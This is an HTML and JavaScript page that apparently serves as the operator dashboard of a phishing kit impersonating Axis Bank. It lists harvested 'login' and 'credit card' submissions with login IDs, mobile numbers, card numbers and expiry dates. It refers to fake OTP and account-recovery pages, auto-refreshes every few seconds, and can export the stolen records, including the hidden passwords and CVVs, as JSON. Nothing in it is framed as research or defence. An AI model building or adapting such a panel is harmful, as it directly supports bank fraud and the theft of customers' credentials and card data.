<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Axis Bank Submissions</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            color: white;
            padding: 20px;
        }
        
        .header {
            background: #87103F;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(135, 16, 63, 0.4);
            position: relative;
            overflow: hidden;
        }
        
        .bank-title {
            font-size: 42px;
            font-weight: bold;
            color: white;
            letter-spacing: 2px;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .live-indicator {
            display: inline-block;
            background: #ff4444;
            color: white;
            padding: 8px 20px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 18px;
            animation: blink 1s infinite;
            box-shadow: 0 0 10px rgba(255, 68, 68, 0.5);
            margin-top: 10px;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .stats-bar {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
        
        .stat-card {
            flex: 1;
            min-width: 200px;
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .stat-number {
            font-size: 36px;
            font-weight: bold;
            color: #ffcc00;
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 14px;
            opacity: 0.8;
        }
        
        .submissions-container {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .section-title {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ffcc00;
            padding-bottom: 10px;
            border-bottom: 2px solid #87103F;
        }
        
        .submissions-list {
            display: flex;
            flex-direction: column;
            gap: 15px;
            max-height: 600px;
            overflow-y: auto;
            padding-right: 10px;
        }
        
        /* Scrollbar styling */
        .submissions-list::-webkit-scrollbar {
            width: 8px;
        }
        
        .submissions-list::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
        }
        
        .submissions-list::-webkit-scrollbar-thumb {
            background: #87103F;
            border-radius: 4px;
        }
        
        .submission-item {
            padding: 20px;
            border-radius: 8px;
            transition: all 0.3s ease;
            animation: slideIn 0.5s ease;
            position: relative;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Different colors for different submission types */
        .login-submission {
            background: linear-gradient(135deg, rgba(135, 16, 63, 0.3) 0%, rgba(106, 12, 50, 0.3) 100%);
            border-left: 4px solid #87103F;
        }
        
        .credit-submission {
            background: linear-gradient(135deg, rgba(0, 100, 200, 0.3) 0%, rgba(0, 70, 150, 0.3) 100%);
            border-left: 4px solid #0064c8;
        }
        
        .new-submission {
            animation: newPulse 5s infinite;
            border: 2px solid #ffcc00;
            box-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
        }
        
        @keyframes newPulse {
            0%, 100% {
                box-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
                border-color: #ffcc00;
            }
            50% {
                box-shadow: 0 0 40px rgba(255, 204, 0, 0.6);
                border-color: #ff9900;
            }
        }
        
        .submission-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .submission-type {
            background: rgba(255, 255, 255, 0.2);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
        }
        
        .submission-time {
            font-size: 14px;
            opacity: 0.8;
        }
        
        .submission-page {
            background: rgba(255, 255, 255, 0.1);
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 12px;
            margin-left: 10px;
        }
        
        .new-badge {
            background: #ff4444;
            color: white;
            padding: 3px 10px;
            border-radius: 10px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 10px;
            animation: blink 1s infinite;
        }
        
        .submission-details {
            margin-top: 10px;
            font-size: 14px;
            line-height: 1.6;
        }
        
        .detail-row {
            display: flex;
            margin-bottom: 5px;
        }
        
        .detail-label {
            min-width: 120px;
            opacity: 0.7;
        }
        
        .detail-value {
            flex: 1;
            word-break: break-all;
        }
        
        .masked {
            color: rgba(255, 255, 255, 0.6);
            font-style: italic;
        }
        
        .controls {
            display: flex;
            gap: 15px;
            margin-top: 30px;
            justify-content: center;
        }
        
        .control-btn {
            padding: 12px 30px;
            background: #87103F;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .control-btn:hover {
            background: #6a0c32;
            transform: translateY(-2px);
        }
        
        .refresh-info {
            text-align: center;
            margin-top: 20px;
            opacity: 0.7;
            font-size: 14px;
        }
        
        .last-update {
            text-align: center;
            margin-top: 10px;
            opacity: 0.5;
            font-size: 12px;
        }
        
        @media (max-width: 768px) {
            .stat-card {
                min-width: 100%;
            }
            
            .bank-title {
                font-size: 32px;
            }
            
            .submission-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }
            
            .detail-row {
                flex-direction: column;
                gap: 5px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <h1 class="bank-title">AXIS BANK</h1>
            <div class="live-indicator">ðŸ”´ LIVE</div>
        </header>
        
        <div class="stats-bar">
            <div class="stat-card">
                <div class="stat-number" id="totalSubmissions">0</div>
                <div class="stat-label">Total Submissions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="loginSubmissions">0</div>
                <div class="stat-label">Login Form Submissions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="creditSubmissions">0</div>
                <div class="stat-label">Credit Card Submissions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="newSubmissions">0</div>
                <div class="stat-label">New Submissions</div>
            </div>
        </div>
        
        <div class="submissions-container">
            <h2 class="section-title">Recent Submissions</h2>
            <div class="submissions-list" id="submissionsList">
                <!-- Submissions will be loaded here -->
            </div>
        </div>
        
        <div class="controls">
            <button class="control-btn" onclick="markAllAsRead()">Mark All as Read</button>
            <button class="control-btn" onclick="clearAllSubmissions()">Clear All Data</button>
            <button class="control-btn" onclick="exportSubmissions()">Export Data</button>
        </div>
        
        <div class="refresh-info" id="refreshInfo">
            Auto-refresh in: <span id="countdown">3</span> seconds
        </div>
        <div class="last-update" id="lastUpdate">
            Last updated: <span id="updateTime">Never</span>
        </div>
    </div>

    <script>
        // Global variables
        let refreshCountdown = 3;
        let countdownInterval;
        let autoRefreshInterval;
        
        // Format time
        function formatTime(dateString) {
            const date = new Date(dateString);
            return date.toLocaleString('en-IN', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            });
        }
        
        // Get page name from URL
        function getPageName(url) {
            if (url.includes('axis_otp1.html')) return 'OTP Page 1';
            if (url.includes('axis_otp2.html')) return 'OTP Page 2';
            if (url.includes('forgot_login.html')) return 'Forgot Login';
            if (url.includes('forgot_card.html')) return 'Forgot Card';
            if (url.includes('more_info.html')) return 'More Info';
            if (url.includes('download_app.html')) return 'Download App';
            return 'Main Page';
        }
        
        // Load submissions from localStorage
        function loadSubmissions() {
            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
            
            // Update stats
            document.getElementById('totalSubmissions').textContent = submissions.length;
            
            const loginCount = submissions.filter(s => s.type === 'login').length;
            const creditCount = submissions.filter(s => s.type === 'credit').length;
            const newCount = submissions.filter(s => s.isNew).length;
            
            document.getElementById('loginSubmissions').textContent = loginCount;
            document.getElementById('creditSubmissions').textContent = creditCount;
            document.getElementById('newSubmissions').textContent = newCount;
            
            // Display submissions
            const submissionsList = document.getElementById('submissionsList');
            submissionsList.innerHTML = '';
            
            if (submissions.length === 0) {
                submissionsList.innerHTML = `
                    <div class="submission-item" style="text-align: center; opacity: 0.7;">
                        No submissions yet. Waiting for data...
                    </div>
                `;
                return;
            }
            
            // Sort by newest first and keep new submissions at top
            submissions.sort((a, b) => {
                // First sort by isNew (new submissions first)
                if (a.isNew !== b.isNew) {
                    return a.isNew ? -1 : 1;
                }
                // Then sort by timestamp (newest first)
                return new Date(b.timestamp) - new Date(a.timestamp);
            });
            
            submissions.forEach((submission, index) => {
                const submissionDiv = document.createElement('div');
                submissionDiv.className = `submission-item ${submission.type}-submission ${submission.isNew ? 'new-submission' : ''}`;
                
                let detailsHTML = '';
                
                if (submission.type === 'login') {
                    detailsHTML = `
                        <div class="detail-row">
                            <div class="detail-label">Login ID:</div>
                            <div class="detail-value">${submission.data.loginId}</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Password:</div>
                            <div class="detail-value masked">â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Mobile:</div>
                            <div class="detail-value">${submission.data.mobile}</div>
                        </div>
                    `;
                } else if (submission.type === 'credit') {
                    detailsHTML = `
                        <div class="detail-row">
                            <div class="detail-label">Card Number:</div>
                            <div class="detail-value">${submission.data.cardNumber}</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Expiry:</div>
                            <div class="detail-value">${submission.data.expiry}</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">CVV:</div>
                            <div class="detail-value masked">â€¢â€¢â€¢</div>
                        </div>
                        <div class="detail-row">
                            <div class="detail-label">Mobile:</div>
                            <div class="detail-value">${submission.data.mobile}</div>
                        </div>
                    `;
                }
                
                submissionDiv.innerHTML = `
                    <div class="submission-header">
                        <div>
                            <span class="submission-type">${submission.type.toUpperCase()} SUBMISSION</span>
                            <span class="submission-page">From: ${getPageName(submission.data.time || 'Main Page')}</span>
                            ${submission.isNew ? '<span class="new-badge">NEW</span>' : ''}
                        </div>
                        <div class="submission-time">${formatTime(submission.timestamp)}</div>
                    </div>
                    <div class="submission-details">
                        ${detailsHTML}
                    </div>
                `;
                
                submissionsList.appendChild(submissionDiv);
            });
            
            // Update last update time
            document.getElementById('updateTime').textContent = new Date().toLocaleString('en-IN', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            });
        }
        
        // Mark all submissions as read
        function markAllAsRead() {
            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
            submissions.forEach(submission => {
                submission.isNew = false;
            });
            localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
            loadSubmissions();
        }
        
        // Clear all submissions
        function clearAllSubmissions() {
            if (confirm('Are you sure you want to delete ALL submissions? This cannot be undone.')) {
                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
                loadSubmissions();
            }
        }
        
        // Export submissions as JSON
        function exportSubmissions() {
            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
            const dataStr = JSON.stringify(submissions, null, 2);
            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
            
            const exportFileDefaultName = `axis-bank-submissions-${new Date().getTime()}.json`;
            
            const linkElement = document.createElement('a');
            linkElement.setAttribute('href', dataUri);
            linkElement.setAttribute('download', exportFileDefaultName);
            linkElement.click();
        }
        
        // Start countdown for auto-refresh
        function startCountdown() {
            refreshCountdown = 3;
            document.getElementById('countdown').textContent = refreshCountdown;
            
            clearInterval(countdownInterval);
            countdownInterval = setInterval(() => {
                refreshCountdown--;
                document.getElementById('countdown').textContent = refreshCountdown;
                
                if (refreshCountdown <= 0) {
                    clearInterval(countdownInterval);
                    loadSubmissions();
                    startCountdown();
                }
            }, 1000);
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            loadSubmissions();
            startCountdown();
            
            // Auto refresh every 3 seconds
            autoRefreshInterval = setInterval(loadSubmissions, 3000);
        });
        
        // Clean up intervals when page is closed
        window.addEventListener('beforeunload', function() {
            clearInterval(countdownInterval);
            clearInterval(autoRefreshInterval);
        });
    </script>
</body>
</html>
